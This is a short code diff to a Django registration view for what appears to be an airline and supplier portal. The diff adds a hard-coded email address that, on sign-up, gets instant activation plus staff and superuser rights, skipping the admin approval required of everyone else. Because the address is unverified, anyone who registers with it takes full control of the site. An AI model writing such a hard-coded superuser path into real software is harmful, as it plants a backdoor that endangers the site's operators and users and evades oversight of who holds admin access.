@@ -33,7 +33,12 @@ def register(request):
         form = UserRegistrationForm(request.POST)
         if form.is_valid():
             user = form.save(commit=False)
-            user.is_active = False # Require admin approval
+            if user.email == 'kkionero@afraa.org':
+                user.is_active = True
+                user.is_staff = True
+                user.is_superuser = True
+            else:
+                user.is_active = False # Require admin approval
             user.save()
             
             # Create corresponding profile
@@ -44,6 +49,10 @@ def register(request):
                 Airline.objects.create(user=user, name=company_name)
             elif account_type == 'supplier':
                 Supplier.objects.create(user=user, name=company_name)
+                
+            if user.is_superuser:
+                messages.success(request, "Admin account registered and activated successfully! You may now log in.")
+                return redirect('login')
                 
             return render(request, 'registration/registration_pending.html')
     else:
